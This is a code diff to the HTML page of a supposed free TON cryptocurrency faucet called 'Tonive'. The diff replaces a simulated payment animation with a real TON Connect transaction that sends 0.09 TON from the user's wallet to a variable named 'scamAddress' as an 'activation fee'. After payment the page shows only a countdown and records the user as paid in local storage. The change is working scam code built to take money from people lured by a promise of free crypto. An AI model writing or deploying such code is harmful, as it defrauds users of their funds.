@@ -6,6 +6,7 @@
     <title>Tonive - Free TON Faucet</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <script src="https://unpkg.com/@ton/ton@16.0.0/dist/ton.umd.min.js"></script>
     <style>
         @keyframes pulse {
             0% { transform: scale(1); }
@@ -14,9 +15,6 @@
         }
         .pulse {
             animation: pulse 2s infinite;
-        }
-        .progress-bar {
-            transition: width 1s linear;
         }
         .ton-bounce {
             animation: tonBounce 0.5s ease infinite alternate;
@@ -30,6 +28,12 @@
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
+        }
+        .spin {
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -82,8 +86,8 @@
                 <div id="payment-processing" class="hidden">
                     <div class="mb-6">
                         <h3 class="text-2xl font-bold mb-4">Processing Payment</h3>
-                        <div class="w-full bg-gray-700 rounded-full h-3 mb-4">
-                            <div id="progress-bar" class="progress-bar bg-green-500 h-3 rounded-full w-0"></div>
+                        <div class="flex justify-center mb-4">
+                            <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-cyan-500"></div>
                         </div>
                         <p class="text-gray-300">Confirm transaction in your wallet...</p>
                     </div>
@@ -217,7 +221,6 @@
         const claimBtn = document.getElementById('claim-btn');
         const claimProcessing = document.getElementById('claim-processing');
         const countdownEl = document.getElementById('countdown');
-        const progressBar = document.getElementById('progress-bar');
         
         // State variables
         let countdownInterval;
@@ -254,30 +257,40 @@
             paymentProcessing.classList.remove('hidden');
             paymentProcessing.classList.add('fade-in');
             
-            // Animate progress bar
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 5;
-                progressBar.style.width = `${progress}%`;
+            try {
+                // Create real TON transaction
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
+                    messages: [
+                        {
+                            address: scamAddress,
+                            amount: '90000000', // 0.09 TON in nanoTON
+                            payload: "Activation fee for Tonive faucet"
+                        }
+                    ]
+                };
                 
-                if (progress >= 100) {
-                    clearInterval(progressInterval);
-                    simulatePayment();
-                }
-            }, 200);
-        });
-        
-        // Simulate payment processing
-        function simulatePayment() {
-            setTimeout(() => {
+                // Send transaction to wallet
+                const result = await connector.sendTransaction(transaction);
+                
+                // Transaction sent successfully
                 paymentProcessing.classList.add('hidden');
                 faucetActive.classList.remove('hidden');
                 faucetActive.classList.add('fade-in');
                 
+                // Store payment status in local storage
+                localStorage.setItem('tonive_paid', 'true');
+                
                 // Start countdown timer
                 startCountdown();
-            }, 2000);
-        }
+                
+            } catch (error) {
+                console.error('Transaction error:', error);
+                paymentProcessing.classList.add('hidden');
+                walletConnected.classList.remove('hidden');
+                alert('Transaction failed: ' + (error.message || 'User rejected transaction'));
+            }
+        });
         
         // Start countdown timer
         function startCountdown() {
@@ -326,13 +339,22 @@
         // Initialize
         (async function init() {
             try {
+                // Restore existing connection
                 await connector.restoreConnection();
-                if (connector.wallet) {
+                
+                // Check if user already paid
+                if (localStorage.getItem('tonive_paid') === 'true') {
+                    connectBtn.classList.add('hidden');
+                    faucetActive.classList.remove('hidden');
+                    startCountdown();
+                } 
+                // Check if wallet is already connected
+                else if (connector.wallet) {
                     connectBtn.classList.add('hidden');
                     walletConnected.classList.remove('hidden');
                 }
             } catch (e) {
-                console.log('No existing connection');
+                console.log('Initialization error:', e);
             }
         })();
     </script>
